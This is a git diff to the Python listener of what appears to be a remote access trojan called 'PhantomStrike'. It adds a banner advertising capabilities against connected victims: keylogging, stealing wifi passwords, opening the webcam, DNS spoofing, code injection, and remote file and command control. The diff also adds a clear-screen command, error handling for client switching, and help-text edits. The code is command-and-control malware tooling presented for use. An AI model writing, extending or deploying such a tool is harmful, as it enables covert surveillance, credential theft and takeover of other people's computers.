@@ -39,7 +39,11 @@ class MultiClientListener:
             return f"[-]File not found :{path}".encode(self.format)
         except Exception as e:
             return f"[-] File reading file:{str(e)}".encode(self.format)
-     
+    
+    def clear_screen(self):
+        """Clears the terminal screen."""
+        os.system('cls' if os.name == 'nt' else 'clear')
+
         
     def writing_file(self,path,content):
         try:
@@ -58,7 +62,23 @@ class MultiClientListener:
 
         self.selector.register(server, selectors.EVENT_READ, data=None)
         print(f"[*] Listening for incoming connections on {self.host}:{self.port}...")
-
+        print("[*] Run help to see how to use this tool ")
+        print("\n")
+        print("                         PhantomStrike v1.0                        ")
+        print("\n")
+        print("                =[       List of payload                    ]       ")
+        print("                =[       ---------------                    ]       ")
+        print("                =[       Downloading file                   ]       ")
+        print("                =[       Uploading file                     ]       ")
+        print("                =[       Deleting file                      ]       ")
+        print("                =[       Executing command on cmd           ]       ")
+        print("                =[       Keylogger                          ]       ")
+        print("                =[       Copying wifi password to Usb       ]       ")
+        print("                =[       Opening webCam                     ]       ")
+        print("                =[       DNS spoofer                        ]       ")
+        print("                =[       Code Injector                      ]       ")
+        print("                =[       More ...                           ]       " )
+        print("\n")
         try:
             while True:
                 events = self.selector.select(timeout=1)  # Non-blocking select
@@ -88,16 +108,19 @@ class MultiClientListener:
                 self.server.close()
                 sys.exit()
             elif command[0].lower()=="switch":
-                client_id = command[1]
-                self.switch_client(int(client_id))
+                try:
+                    client_id = command[1]
+                    self.switch_client(int(client_id))
+                except Exception as e:
+                    print(f'[-] Error "{e}"')
             elif command[0].lower() == "help":
                 print("commands       Description")
                 print("--------       -----------")
                 print("CTRL + C       Exit Forcibly")
                 print("exit           Exiting the shell")
                 print("switch <id>    switching from one client id to another")
-                print("exit           to exit form any client interpreter\n")
-                print("list           list all client connected.")
+                print("exit           to exit form any client interpreter")
+                print("list           list all client connected.\n")
                 print("For more information on tools see the command-line reference on the github page.")
 
 
@@ -235,8 +258,8 @@ class MultiClientListener:
         elif command[0] =="switch":
             client_id = command[2]
             self.switch_client(int(client_id))
-
-
+        elif command[0] == 'clear':
+            self.clear_screen()
         elif command[0] == "download":
             self.sending_data(command)
             data = self.receiving_data(conn)
